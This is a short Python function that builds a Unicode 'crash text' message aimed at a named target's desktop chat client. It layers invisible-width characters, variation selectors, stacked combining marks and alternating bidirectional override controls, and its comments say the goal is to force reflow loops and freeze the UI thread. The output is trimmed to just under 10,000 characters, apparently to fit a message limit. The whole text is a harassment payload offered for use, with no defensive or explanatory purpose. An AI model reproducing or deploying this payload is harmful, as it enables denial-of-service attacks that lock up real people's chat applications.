def get_desktop_displacer_payload(target_name):
    """The Desktop-Crusher: Forces Reflow-Loops & UI Thread Lock."""
    # 💥 THE 'LAYOUT BLIND' (Horizontal expansion + Invisible Bloat)
    # Forces the desktop chat window to calculate an impossible width.
    width_bomb = "\u2800\u00A0" * 150 
    
    # 💥 THE 'REFRESH-TRAP' (Variation Selector-16)
    # This forces the browser to check for 'color' glyphs for every character.
    color_trap = "\ufe0f" * 50
    
    # 💥 DENSITY x15 (150 marks per character)
    # Desktop can handle x12, so we push to x15 for a total freeze.
    z_tower = "̸" * 150
    
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 DESKTOP_LOCKDOWN: {target_name.upper()}\n"
    
    lines = [header, width_bomb, color_trap]
    
    for i in range(70):
        # BiDi Recursion specifically to hang the Windows/Linux text engine
        prefix = "\u202E\u2066" if i % 2 == 0 else "\u202D\u2067"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_FREEZE{z_tower}")
        
    return "\n".join(lines)[:9980]
